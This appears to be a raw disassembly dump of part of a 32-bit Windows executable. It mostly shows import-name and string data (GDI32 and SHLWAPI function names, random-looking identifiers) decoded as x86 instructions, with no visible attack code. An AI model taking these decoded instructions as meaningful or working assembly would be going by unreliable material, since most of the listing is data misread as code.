  4137fb:	outs   dx,DWORD PTR ds:[esi]
  4137fc:	ins    BYTE PTR es:[edi],dx
  4137fd:	jns    0x413866
  4137ff:	outs   dx,DWORD PTR ds:[esi]
  413800:	outs   dx,BYTE PTR ds:[esi]
  413801:	push   edx
  413802:	outs   dx,BYTE PTR ds:[si]
  413804:	add    BYTE PTR [eax],al
  413806:	xchg   ebx,eax
  413807:	add    BYTE PTR [ebx+0x72],al
  41380a:	gs popa 
  41380c:	je     0x413873
  41380e:	inc    esp
  41380f:	dec    ecx
  413810:	inc    edx
  413811:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb6000070
  413819:	add    BYTE PTR [ebp+eiz*2+0x6c],al
  41381d:	gs je  0x413885
  413820:	dec    edi
  413821:	bound  ebp,QWORD PTR [edx+0x65]
  413824:	arpl   WORD PTR [eax+eax*1+0x0],si
  413828:	outs   dx,BYTE PTR ds:[esi]
  413829:	add    DWORD PTR [edi+0x65],eax
  41382c:	je     0x41387e
  41382e:	imul   edi,DWORD PTR [eax+0x65],0x8900006c
  413835:	add    BYTE PTR [ebx+0x72],al
  413838:	gs popa 
  41383a:	je     0x4138a1
  41383c:	inc    edx
  41383d:	jb     0x4138b4
  41383f:	jae    0x4138a9
  413841:	dec    ecx
  413842:	outs   dx,BYTE PTR ds:[esi]
  413843:	imul   esi,DWORD PTR fs:[edx+0x65],0x8a007463
  41384b:	add    DWORD PTR [edi+0x65],eax
  41384e:	je     0x4138a4
  413850:	gs js  0x4138c7
  413853:	dec    ebp
  413854:	gs je  0x4138c9
  413857:	imul   esp,DWORD PTR [ebx+0x73],0x870041
  41385e:	inc    ebx
  41385f:	jb     0x4138c6
  413861:	popa   
  413862:	je     0x4138c9
  413864:	inc    edx
  413865:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xd3000070
  41386d:	add    DWORD PTR [ebx+0x65],edx
  413870:	je     0x4138b4
  413872:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x6d694470
  41387a:	outs   dx,BYTE PTR gs:[esi]
  41387c:	jae    0x4138e7
  41387e:	outs   dx,DWORD PTR ds:[esi]
  41387f:	outs   dx,BYTE PTR ds:[esi]
  413880:	inc    ebp
  413881:	js     0x413883
  413883:	add    BYTE PTR [edx+0x65724300],bl
  413889:	popa   
  41388a:	je     0x4138f1
  41388c:	inc    esi
  41388d:	outs   dx,DWORD PTR ds:[esi]
  41388e:	outs   dx,BYTE PTR ds:[esi]
  41388f:	je     0x4138da
  413891:	outs   dx,BYTE PTR ds:[esi]
  413892:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41389a:	iret   
  41389b:	add    DWORD PTR [ebx+0x65],edx
  41389e:	ins    BYTE PTR es:[edi],dx
  41389f:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4138a4:	ins    BYTE PTR es:[edi],dx
  4138a5:	gs je  0x41391c
  4138a8:	gs add dh,al
  4138ab:	add    DWORD PTR [edx+0x6f],edx
  4138ae:	jne    0x41391e
  4138b0:	fs push edx
  4138b2:	arpl   WORD PTR gs:[eax+eax*1-0x50],si
  4138b7:	add    BYTE PTR [ebx+0x72],al
  4138ba:	gs popa 
  4138bc:	je     0x413923
  4138be:	push   ebx
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	ins    BYTE PTR es:[edi],dx
  4138c1:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  4138c9:	add    BYTE PTR [edx],bh
  4138cb:	add    DWORD PTR [edi+0x65],eax
  4138ce:	je     0x413913
  4138d0:	jne    0x413944
  4138d2:	jb     0x413939
  4138d4:	outs   dx,BYTE PTR ds:[esi]
  4138d5:	je     0x413926
  4138d7:	bound  ebp,QWORD PTR [edx+0x65]
  4138da:	arpl   WORD PTR [eax+eax*1+0x0],si
  4138de:	stos   DWORD PTR es:[edi],eax
  4138df:	add    BYTE PTR [ebx+0x72],al
  4138e2:	gs popa 
  4138e4:	je     0x41394b
  4138e6:	push   edx
  4138e7:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  4138ec:	outs   dx,BYTE PTR ds:[esi]
  4138ed:	add    al,dl
  4138ef:	add    DWORD PTR [ebx+0x65],edx
  4138f2:	je     0x413935
  4138f4:	bound  ebp,QWORD PTR [edi+0x72]
  4138f7:	je     0x413949
  4138f9:	jb     0x41396a
  4138fb:	arpl   WORD PTR [eax],ax
  4138fd:	add    ah,cl
  4138ff:	add    DWORD PTR [ebx+0x65],edx
  413902:	ins    BYTE PTR es:[edi],dx
  413903:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  413908:	imul   esi,DWORD PTR [eax+0x52],0x9e006e67
  41390f:	add    BYTE PTR [ebx+0x72],al
  413912:	gs popa 
  413914:	je     0x41397b
  413916:	inc    esi
  413917:	outs   dx,DWORD PTR ds:[esi]
  413918:	outs   dx,BYTE PTR ds:[esi]
  413919:	je     0x413972
  41391b:	add    bh,al
  41391d:	add    BYTE PTR [ebp+0x6e],al
  413920:	jne    0x41398f
  413922:	inc    esi
  413923:	outs   dx,DWORD PTR ds:[esi]
  413924:	outs   dx,BYTE PTR ds:[esi]
  413925:	je     0x41399a
  413927:	push   edi
  413928:	add    BYTE PTR [eax],al
  41392a:	dec    ebx
  41392b:	add    DWORD PTR [edi+0x65],eax
  41392e:	je     0x413976
  413930:	outs   dx,DWORD PTR ds:[esi]
  413931:	outs   dx,BYTE PTR ds:[esi]
  413932:	je     0x413978
  413934:	popa   
  413935:	je     0x413998
  413937:	add    BYTE PTR [ebp+0x766f4d01],bl
  41393d:	gs push esp
  41393f:	outs   dx,DWORD PTR ds:[esi]
  413940:	inc    ebp
  413941:	js     0x413943
  413943:	add    BYTE PTR [ecx+eax*1+0x47],ch
  413947:	gs je  0x41399a
  41394a:	popa   
  41394b:	ins    BYTE PTR es:[edi],dx
  41394c:	gs je  0x4139c3
  41394f:	gs inc ebp
  413951:	outs   dx,BYTE PTR ds:[esi]
  413952:	je     0x4139c6
  413954:	imul   esp,DWORD PTR [ebp+0x73],0x54020c00
  41395b:	gs js  0x4139d2
  41395e:	dec    edi
  41395f:	jne    0x4139d5
  413961:	push   edi
  413962:	add    BYTE PTR [eax],al
  413964:	rol    BYTE PTR [ecx],cl
  413966:	push   ebx
  413967:	gs je  0x4139ac
  41396a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  413972:	jae    0x413974
  413974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413975:	add    DWORD PTR [eax+0x61],edx
  413978:	je     0x4139bc
  41397a:	ins    BYTE PTR es:[edi],dx
  41397b:	je     0x41397d
  41397d:	add    BYTE PTR [ecx+0x66664f01],ah
  413983:	jae    0x4139ea
  413985:	je     0x4139dd
  413987:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41398e:	dec    edi
  41398f:	jb     0x4139f8
  413991:	inc    ebp
  413992:	js     0x413994
  413994:	xlat   BYTE PTR ds:[ebx]
  413995:	add    BYTE PTR [esi+0x69],al
  413998:	ins    BYTE PTR es:[edi],dx
  413999:	ins    BYTE PTR es:[edi],dx
  41399a:	push   edx
  41399b:	outs   dx,BYTE PTR ds:[si]
  41399d:	add    BYTE PTR [esi+0x65724300],dl
  4139a3:	popa   
  4139a4:	je     0x413a0b
  4139a6:	inc    ebp
  4139a7:	ins    BYTE PTR es:[edi],dx
  4139a8:	ins    BYTE PTR es:[edi],dx
  4139a9:	imul   esi,DWORD PTR [eax+0x74],0x67526369
  4139b0:	outs   dx,BYTE PTR ds:[esi]
  4139b1:	dec    ecx
  4139b2:	outs   dx,BYTE PTR ds:[esi]
  4139b3:	imul   esi,DWORD PTR fs:[edx+0x65],0x87007463
  4139bb:	add    DWORD PTR [edi+0x65],eax
  4139be:	je     0x413a14
  4139c0:	gs js  0x413a37
  4139c3:	inc    ebp
  4139c4:	js     0x413a3a
  4139c6:	outs   dx,BYTE PTR gs:[esi]
  4139c8:	je     0x413a1a
  4139ca:	outs   dx,DWORD PTR ds:[esi]
  4139cb:	imul   ebp,DWORD PTR [esi+0x74],0x1c40057
  4139d2:	push   edx
  4139d3:	gs jae 0x413a3f
  4139d6:	jp     0x413a3d
  4139d8:	push   eax
  4139d9:	popa   
  4139da:	ins    BYTE PTR es:[edi],dx
  4139db:	gs je  0x413a52
  4139de:	gs add bh,dl
  4139e1:	add    DWORD PTR [ebx+0x65],edx
  4139e4:	je     0x413a28
  4139e6:	jb     0x413a5d
  4139e8:	jae    0x413a52
  4139ea:	dec    edi
  4139eb:	jb     0x413a54
  4139ed:	inc    ebp
  4139ee:	js     0x4139f0
  4139f0:	mov    al,ds:0x66664f01
  4139f5:	jae    0x413a5c
  4139f7:	je     0x413a4b
  4139f9:	outs   dx,BYTE PTR ds:[si]
  4139fb:	add    BYTE PTR [ebx],cl
  4139fd:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  413a01:	je     0x413a52
  413a03:	jne    0x413a79
  413a05:	inc    ecx
  413a06:	add    BYTE PTR [eax],al
  413a08:	mov    eax,0x61655201
  413a0d:	ins    BYTE PTR es:[edi],dx
  413a0e:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  413a15:	je     0x413a8b
  413a17:	add    BYTE PTR gs:[eax],al
  413a1a:	inc    edi
  413a1b:	inc    esp
  413a1c:	dec    ecx
  413a1d:	xor    esi,DWORD PTR [edx]
  413a1f:	cs fs ins BYTE PTR es:[edi],dx
  413a22:	ins    BYTE PTR es:[edi],dx
  413a23:	add    BYTE PTR [esi+0x0],al
  413a26:	push   eax
  413a27:	popa   
  413a28:	je     0x413a92
  413a2a:	inc    esi
  413a2b:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413a32:	outs   dx,BYTE PTR ds:[esi]
  413a33:	jae    0x413a9e
  413a35:	outs   dx,DWORD PTR ds:[esi]
  413a36:	outs   dx,BYTE PTR ds:[esi]
  413a37:	inc    ecx
  413a38:	add    BYTE PTR [eax],al
  413a3a:	push   ebx
  413a3b:	dec    eax
  413a3c:	dec    esp
  413a3d:	push   edi
  413a3e:	inc    ecx
  413a3f:	push   eax
  413a40:	dec    ecx
  413a41:	cs fs ins BYTE PTR es:[edi],dx
  413a44:	ins    BYTE PTR es:[edi],dx
  413a45:	add    BYTE PTR [ebp+0x6b],dh
  413a48:	popa   
  413a49:	jns    0x413a90
  413a4b:	pop    ecx
  413a4c:	je     0x413a96
  413a4e:	push   edx
  413a4f:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413a56:	call   0x413e:0xa200413e
  413a5d:	add    BYTE PTR [esi-0x17ffbec4],bl
  413a63:	or     esi,DWORD PTR [edx-0x3db086f2]
  413a69:	dec    esi
  413a6a:	ja     0x413abb
  413a6c:	cmp    eax,0x384f4f4f
  413a71:	dec    edi
  413a72:	jp     0x413ac3
  413a74:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a77:	dec    edi
  413a78:	ss dec edi
  413a7a:	add    ecx,DWORD PTR [edi+0x31]
  413a7d:	dec    edi
  413a7e:	ret    0x324e
  413a81:	dec    edi
  413a82:	push   ds
  413a83:	push   edx
  413a84:	pop    ds
  413a85:	push   ebx
  413a86:	cmp    DWORD PTR [edi+0x79],ecx
  413a89:	dec    edi
  413a8a:	ret    0x774e
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x384f4f4f
  413a93:	dec    edi
  413a94:	jp     0x413ae5
  413a96:	cmp    ecx,DWORD PTR [edi+0x5e]
  413a99:	dec    edi
  413a9a:	ss dec edi
  413a9c:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  413aa3:	dec    edi
  413aa4:	push   ds
  413aa5:	bound  ebx,QWORD PTR [edi]
  413aa7:	arpl   WORD PTR [ecx],di
  413aa9:	dec    edi
  413aaa:	jns    0x413afb
  413aac:	ret    0x724e
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f034f
  413ab5:	dec    edi
  413ab6:	dec    esp
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	jb     0x413ae0
  413ac1:	jae    0x413ad2
  413ac3:	or     DWORD PTR [eax],0xffffff80
  413ac6:	js     0x413a58
  413ac8:	jns    0x413a5b
  413aca:	aas    
  413acb:	dec    edi
  413acc:	jbe    0x413b1d
  413ace:	ret    0x764e
  413ad1:	dec    edi
  413ad2:	ds dec edi
  413ad4:	dec    esp
  413ad5:	dec    edi
  413ad6:	cmp    DWORD PTR [edi+0x3],ecx
  413ad9:	dec    edi
  413ada:	xor    eax,0x364ec24f
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	sbb    BYTE PTR [edi],0x83
  413ae4:	setae  BYTE PTR [eax]
  413ae7:	nop
  413ae8:	js     0x413a8a
  413aea:	jns    0x413a8d
  413aec:	aas    
  413aed:	dec    edi
  413aee:	jbe    0x413b3f
  413af0:	ret    0x764e
  413af3:	dec    edi
  413af4:	ds dec edi
  413af6:	dec    esp
  413af7:	dec    edi
  413af8:	cmp    DWORD PTR [edi+0x69],ecx
  413afb:	dec    edi
  413afc:	xor    eax,0x364ec24f
  413b01:	dec    edi
  413b02:	push   ds
  413b03:	xchg   edx,eax
  413b04:	pop    ds
  413b05:	xchg   ebx,eax
  413b06:	bt     DWORD PTR [eax],ecx
  413b09:	mov    al,ds:0xb179b078
  413b0e:	aas    
  413b0f:	dec    edi
  413b10:	push   0x4e4ec24f
  413b15:	dec    edi
  413b16:	cmp    eax,0x394f034f
  413b1b:	dec    edi
  413b1c:	push   ecx
  413b1d:	dec    edi
  413b1e:	xor    al,0x4f
  413b20:	ret    0x364e
  413b23:	dec    edi
  413b24:	push   ds
  413b25:	mov    ds:0xb30fa31f,al
  413b2a:	or     BYTE PTR [eax-0x3e863f88],dh
  413b30:	aas    
  413b31:	dec    edi
  413b32:	push   0x4e4ec24f
  413b37:	dec    edi
  413b38:	cmp    eax,0x394f784f
  413b3d:	dec    edi
  413b3e:	pop    edi
  413b3f:	dec    edi
  413b40:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b43:	dec    esi
  413b44:	xor    eax,0x1fb21e4f
  413b49:	mov    bl,0xf
  413b4b:	ret    
  413b4c:	or     al,al
  413b4e:	js     0x413b20
  413b50:	jns    0x413b23
  413b52:	aas    
  413b53:	dec    edi
  413b54:	push   0x4e4ec24f
  413b59:	dec    edi
  413b5a:	cmp    eax,0x394f724f
  413b5f:	dec    edi
  413b60:	dec    esi
  413b61:	dec    edi
  413b62:	xor    al,0x4f
  413b64:	ret    0x304e
  413b67:	dec    edi
  413b68:	push   ds
  413b69:	ret    0xc31f
  413b6c:	psrlq  mm1,QWORD PTR [eax]
  413b6f:	sar    BYTE PTR [eax-0x20],1
  413b72:	jns    0x413b55
  413b74:	aas    
  413b75:	dec    edi
  413b76:	push   0x4e4ec24f
  413b7b:	dec    edi
  413b7c:	cmp    eax,0x394f734f
  413b81:	dec    edi
  413b82:	dec    esp
  413b83:	dec    edi
  413b84:	xor    al,0x4f
  413b86:	ret    0x364e
  413b89:	dec    edi
  413b8a:	push   ds
  413b8b:	rcr    BYTE PTR [edi],cl
  413b8d:	ror    DWORD PTR [edi],cl
  413b8f:	jecxz  0x413b99
  413b91:	loopne 0x413c0b
  413b93:	lock jns 0x413b87
  413b96:	aas    
  413b97:	dec    edi
  413b98:	ins    DWORD PTR es:[edi],dx
  413b99:	dec    edi
  413b9a:	ret    0x5f4e
  413b9d:	dec    edi
  413b9e:	cmp    eax,0x3e4f524f
  413ba3:	dec    edi
  413ba4:	ret    0x3f4e
  413ba7:	dec    edi
  413ba8:	push   ds
  413ba9:	loop   0x413bca
  413bab:	jecxz  0x413bbc
  413bad:	repz or al,dh
  413bb0:	js     0x413bb2
  413bb2:	jns    0x413bb5
  413bb4:	js     0x413bc6
  413bb6:	jns    0x413bc9
  413bb8:	ds dec edi
  413bba:	jg     0x413c0b
  413bbc:	ret    0x5b4e
  413bbf:	dec    edi
  413bc0:	cmp    al,0x4f
  413bc2:	jb     0x413c13
  413bc4:	ds dec edi
  413bc6:	dec    ebp
  413bc7:	dec    edi
  413bc8:	cmp    ecx,DWORD PTR [edi-0x3e]
  413bcb:	dec    esi
  413bcc:	xor    eax,0x1f021e4f
  413bd1:	add    ecx,DWORD PTR [edi]
  413bd3:	adc    ecx,DWORD PTR [eax]
  413bd5:	adc    BYTE PTR [eax+0x20],bh
  413bd8:	jns    0x413bfb
  413bda:	aas    
  413bdb:	dec    edi
  413bdc:	add    BYTE PTR [eax],al
  413bde:	data16 cmp al,BYTE PTR [ecx+0x0]
  413be2:	pop    edx
  413be3:	cmp    al,0x41
  413be5:	add    BYTE PTR [edx+0x3c],ah
  413be8:	inc    ecx
  413be9:	add    BYTE PTR [esi+0xe00413e],ah
  413bef:	ds inc ecx
  413bf1:	add    BYTE PTR [esi+0x4200413e],dl
  413bf7:	cmp    al,0x41
  413bf9:	add    BYTE PTR [esi+0x3c],al
  413bfc:	inc    ecx
  413bfd:	add    BYTE PTR [esi-0x55ffbec2],cl
  413c03:	cmp    al,0x41
  413c05:	add    BYTE PTR [edx-0x4e076357],cl
  413c0b:	mov    edx,0x3c5ef89c
  413c10:	inc    ecx
  413c11:	add    dh,al
  413c13:	cmp    eax,0x3dda0041
  413c18:	inc    ecx
  413c19:	add    dh,ah
  413c1b:	cmp    eax,0x3df60041
  413c20:	inc    ecx
  413c21:	add    BYTE PTR [esi+0x6200413c],dl
  413c27:	cmp    al,BYTE PTR [ecx+0x0]
  413c2a:	mov    dh,0x3c
  413c2c:	inc    ecx
  413c2d:	add    BYTE PTR [esi-0x55ffbec4],ah
  413c33:	ds inc ecx
  413c35:	add    BYTE PTR [ecx],dh
  413c37:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413c3e:	push   0x3c
  413c40:	inc    ecx
  413c41:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413c47:	or     eax,0x705
  413c4c:	inc    eax
  413c4d:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413c51:	fisttp QWORD PTR [ebx]
  413c53:	ss inc ebx
  413c55:	add    BYTE PTR [edx+0x68],dh
  413c58:	inc    ebp
  413c59:	inc    ecx
  413c5a:	(bad)  
  413c5b:	cli    
  413c5c:	jne    0x413cc0
  413c5e:	(bad)  
  413c5f:	in     eax,dx
  413c60:	inc    BYTE PTR [edi]
  413c62:	mov    eax,0x5205a3fa
  413c67:	cmp    al,0x41
  413c69:	add    BYTE PTR [edx],dh
  413c6b:	xchg   ebp,eax
  413c6c:	pushf  
  413c6d:	clc    
  413c6e:	xor    dl,BYTE PTR [esi-0x6acc0764]
  413c74:	pushf  
  413c75:	clc    
  413c76:	cmp    al,0x95
  413c78:	pushf  
  413c79:	clc    
  413c7a:	cmp    eax,0x3ef89c95
  413c7f:	xchg   ebp,eax
  413c80:	pushf  
  413c81:	clc    
  413c82:	aas    
  413c83:	xchg   ebp,eax
  413c84:	pushf  
  413c85:	clc    
  413c86:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413c8c:	pushf  
  413c8d:	clc    
  413c8e:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413c94:	pushf  
  413c95:	clc    
  413c96:	in     eax,dx
  413c97:	stc    
  413c98:	add    esp,DWORD PTR [eax+0x5a]
  413c9b:	cmp    al,BYTE PTR [ecx+0x0]
  413c9e:	(bad)  
  413c9f:	add    BYTE PTR [ebx+0x0],al
  413ca2:	pop    ecx
  413ca3:	dec    ecx
  413ca4:	imul   si,WORD PTR [ecx],0xff85
  413ca8:	pushf  
  413ca9:	clc    
  413caa:	sahf   
  413cab:	jmp    0x5b54400
  413cb0:	add    BYTE PTR [eax],al
  413cb2:	push   esi
  413cb3:	cmp    al,BYTE PTR [ecx+0x0]
  413cb6:	pushf  
  413cb7:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413cea:	jecxz  0x413c7b
  413cec:	inc    eax
  413ced:	add    dh,bh
  413cef:	adc    BYTE PTR [ebx+0x0],al
  413cf2:	add    BYTE PTR [eax],al
  413cf4:	add    BYTE PTR [eax],al
  413cf6:	inc    esp
  413cf7:	add    BYTE PTR [esi+0x0],al
  413cfa:	imul   eax,DWORD PTR [eax],0x4a006f
  413d00:	dec    ecx
  413d01:	add    BYTE PTR [eax+eax*1+0x46],al
  413d05:	add    BYTE PTR [eax+eax*1+0x49],cl
  413d09:	add    BYTE PTR [ebp+0x0],dl
  413d0c:	inc    esi
  413d0d:	add    BYTE PTR [edi+0x0],cl
  413d10:	imul   eax,DWORD PTR [eax],0x6f
  413d13:	add    BYTE PTR [edx+0x0],ch
  413d16:	dec    ebx
  413d17:	add    BYTE PTR [eax+eax*1+0x66],cl
  413d1b:	add    BYTE PTR [edx+0x0],ch
  413d1e:	imul   eax,DWORD PTR [eax],0x46006f
  413d24:	jo     0x413d26
  413d26:	outs   dx,DWORD PTR ds:[esi]
  413d27:	add    BYTE PTR [ebx+0x0],ch
  413d2a:	ins    DWORD PTR es:[edi],dx
  413d2b:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413d2f:	add    BYTE PTR [ebx+0x0],dh
  413d32:	ins    BYTE PTR es:[edi],dx
  413d33:	add    BYTE PTR [edx+0x0],ch
  413d36:	data16 add BYTE PTR [edi+0x0],ah
  413d3a:	imul   eax,DWORD PTR [eax],0x64006f
  413d40:	add    BYTE PTR [di+0x0],dh
  413d44:	imul   eax,DWORD PTR [eax],0x69006a
  413d4a:	outs   dx,DWORD PTR ds:[esi]
  413d4b:	add    BYTE PTR [esi+0x0],ah
  413d4e:	add    BYTE PTR fs:[ebp+0x0],dh
  413d52:	push   0x0
  413d54:	add    BYTE PTR [bp+0x0],ah
  413d58:	add    BYTE PTR fs:[eax],al
  413d5b:	add    BYTE PTR [eax],al
  413d5d:	add    BYTE PTR [ebx+0x4a],cl
  413d60:	inc    esp
  413d61:	dec    esp
  413d62:	dec    edx
  413d63:	imul   ecx,DWORD PTR [ebx+ecx*2+0x49],0x55
  413d68:	inc    esp
  413d69:	dec    ecx
  413d6a:	dec    ecx
  413d6b:	inc    esp
  413d6c:	dec    edi
  413d6d:	jne    0x413dd3
  413d6f:	dec    ecx
  413d70:	dec    esp
  413d71:	push   ebp
  413d72:	imul   ebp,DWORD PTR fs:[edi+0x55],0x6a49444b
  413d7a:	imul   ebp,DWORD PTR [esp+eiz*2+0x4b],0x4a
  413d7f:	inc    esp
  413d80:	imul   ebp,DWORD PTR [esp+eax*2+0x4c],0x444a494b
  413d88:	ins    BYTE PTR es:[edi],dx
  413d89:	imul   ebp,DWORD PTR [edx+0x64],0x4c
  413d8d:	dec    ebx
  413d8e:	push   ebp
  413d8f:	inc    esp
  413d90:	outs   dx,DWORD PTR ds:[esi]
  413d91:	imul   esi,DWORD PTR [ebp+0x6a],0x4a6b6c64
  413d98:	dec    esp
  413d99:	dec    ebx
  413d9a:	inc    esp
  413d9b:	dec    edx
  413d9c:	dec    edi
  413d9d:	sub    al,BYTE PTR [ebp+edx*2+0x4c]
  413da1:	inc    esp
  413da2:	inc    esp
  413da3:	add    BYTE PTR [eax],al
  413da5:	add    BYTE PTR [esi+0x6b],ah
  413da8:	fs jae 0x413e12
  413dab:	addr16 data16 fs addr16 fs data16 addr16 data16 fs data16 add BYTE PTR fs:[bx+si],al
	...
  413dc1:	add    BYTE PTR [ecx+0x550040c0],bl
  413dc7:	dec    edi
  413dc8:	pop    edi
  413dc9:	dec    edi
  413dca:	dec    esp
  413dcb:	dec    edi
  413dcc:	push   eax
  413dcd:	dec    edi
  413dce:	pop    edi
  413dcf:	dec    edi
  413dd0:	push   esi
  413dd1:	dec    edi
  413dd2:	or     eax,0xc24f0c4f
  413dd7:	dec    esi
  413dd8:	add    BYTE PTR [eax],al
  413dda:	pop    ecx
  413ddb:	dec    edi
  413ddc:	pop    esi
  413ddd:	dec    edi
  413dde:	pop    ebx
  413ddf:	dec    edi
  413de0:	or     eax,0xc24f0c4f
  413de5:	dec    esi
  413de6:	dec    edi
  413de7:	dec    edi
  413de8:	dec    ebp
  413de9:	dec    edi
  413dea:	pop    edi
  413deb:	dec    edi
  413dec:	dec    esp
  413ded:	dec    edi
  413dee:	or     eax,0xc24f0c4f
  413df3:	dec    esi
  413df4:	add    BYTE PTR [eax],al
  413df6:	dec    ebp
  413df7:	dec    edi
  413df8:	pop    edx
  413df9:	dec    edi
  413dfa:	push   esi
  413dfb:	dec    edi
  413dfc:	dec    ecx
  413dfd:	dec    edi
  413dfe:	arpl   WORD PTR [edi+0x52],cx
  413e01:	dec    edi
  413e02:	pop    ebx
  413e03:	dec    edi
  413e04:	ret    0x4e
  413e07:	add    BYTE PTR [eax],al
  413e09:	add    BYTE PTR [eax],al
  413e0b:	add    BYTE PTR [eax],al
  413e0d:	add    BYTE PTR [esi+0x7d],ch
  413e10:	outs   dx,BYTE PTR ds:[esi]
  413e11:	lea    ebp,[esi-0x63]
  413e14:	outs   dx,BYTE PTR ds:[esi]
  413e15:	lods   eax,DWORD PTR ds:[esi]
  413e16:	outs   dx,BYTE PTR ds:[esi]
  413e17:	mov    ebp,0xdd6ecd6e
  413e1c:	outs   dx,BYTE PTR ds:[esi]
  413e1d:	in     eax,dx
  413e1e:	outs   dx,BYTE PTR ds:[esi]
  413e1f:	std    
  413e20:	outs   dx,BYTE PTR ds:[esi]
  413e21:	or     eax,0x2d6e1d6e
  413e26:	outs   dx,BYTE PTR ds:[esi]
  413e27:	cmp    eax,0x6d6e5d6e
  413e2c:	outs   dx,BYTE PTR ds:[esi]
  413e2d:	jb     0x413e9d
  413e2f:	jae    0x413e9f
  413e31:	jo     0x413ea1
  413e33:	jno    0x413ea3
  413e35:	jbe    0x413ea5
  413e37:	ja     0x413ea7
  413e39:	je     0x413ea9
  413e3b:	jne    0x413eab
  413e3d:	mov    ch,BYTE PTR [esi-0x75]
  413e40:	outs   dx,BYTE PTR ds:[esi]
  413e41:	mov    BYTE PTR [esi-0x77],ch
  413e44:	outs   dx,BYTE PTR ds:[esi]
  413e45:	mov    gs,WORD PTR [esi+0x7c]
  413e48:	pop    esi
  413e49:	jge    0x413e99
  413e4b:	jge    0x413e0b
  413e4d:	jge    0x413ea7
  413e4f:	(bad)  
  413e50:	jns    0x413ec2
  413e52:	mov    ecx,0x7d736eb1
  413e57:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413e5d:	add    BYTE PTR [ecx+0x17],cl
  413e60:	mov    ebx,0x4af4b956
  413e65:	aaa    
  413e66:	dec    edx
  413e67:	jle    0x413e02
  413e69:	jno    0x413ecb
  413e6b:	mov    cl,0x4
  413e6d:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413e74:	inc    esp
  413e75:	xlat   BYTE PTR ds:[ebx]
  413e76:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413e7c:	rcr    esi,cl
  413e7e:	(bad)  
  413e7f:	leave  
  413e80:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413e86:	fs icebp 
  413e88:	push   eax
  413e89:	(bad)  
  413e8a:	rcr    DWORD PTR [eax],1
  413e8c:	shl    DWORD PTR [ecx-0x11],1
  413e8f:	(bad)  [ebx+0x7]
  413e92:	mov    dl,0x3c
  413e94:	inc    ecx
  413e95:	add    BYTE PTR [esi+0x30],al
  413e98:	shl    DWORD PTR [ebx],0xb8
  413e9b:	and    DWORD PTR [ecx+0x0],eax
  413e9e:	inc    esi
  413e9f:	push   ebx
  413ea0:	outs   dx,DWORD PTR ds:[esi]
  413ea1:	push   ebx
  413ea2:	dec    edx
  413ea3:	cmp    al,0x41
  413ea5:	add    BYTE PTR [esi-0x70ffbec4],ch
  413eab:	in     eax,dx
  413eac:	adc    al,BYTE PTR [edi]
	...
  413ece:	inc    ecx
  413ecf:	inc    edi
  413ed0:	jae    0x413f3b
  413ed2:	inc    edx
  413ed3:	jae    0x413f3a
  413ed5:	popa   
  413ed6:	push   ecx
  413ed7:	pop    eax
  413ed8:	pop    ecx
  413ed9:	outs   dx,BYTE PTR ds:[esi]
  413eda:	jbe    0x413f54
  413edc:	jns    0x413f32
  413ede:	push   ecx
  413edf:	imul   ebp,DWORD PTR [ebx+0x74],0x61
  413ee3:	jns    0x413f34
  413ee5:	inc    ebx
  413ee6:	jo     0x413f5a
  413ee8:	data16 jp 0x413f3d
  413eeb:	jp     0x413f45
  413eed:	ins    BYTE PTR es:[edi],dx
  413eee:	je     0x413f5f
  413ef0:	jns    0x413f60
  413ef2:	popa   
  413ef3:	push   esi
  413ef4:	push   ebp
  413ef5:	push   0x0
	...
  413f0a:	popa   
  413f0b:	push   edi
  413f0c:	push   esi
  413f0d:	push   esp
  413f0e:	dec    eax
  413f0f:	je     0x413f5d
  413f11:	push   ebx
  413f12:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413f16:	push   esp
  413f17:	arpl   WORD PTR [ecx+0x4b],cx
  413f1a:	inc    edi
  413f1b:	jne    0x413f63
  413f1d:	push   ebx
  413f1e:	outs   dx,DWORD PTR ds:[esi]
  413f1f:	push   ebx
  413f20:	inc    esi
  413f21:	inc    edi
  413f22:	push   0x66495949
  413f27:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413f2b:	push   esi
  413f2c:	jb     0x413f96
  413f2e:	add    BYTE PTR [eax],al
  413f30:	js     0x413fa6
  413f32:	popa   
  413f33:	inc    ebx
  413f34:	push   ecx
  413f35:	ins    BYTE PTR es:[edi],dx
  413f36:	pop    eax
  413f37:	ja     0x413f86
  413f39:	je     0x413fb1
  413f3b:	add    BYTE PTR [ebp+0x7a],dl
  413f3e:	ins    BYTE PTR es:[edi],dx
  413f3f:	jb     0x413fba
  413f41:	inc    edi
  413f42:	push   edi
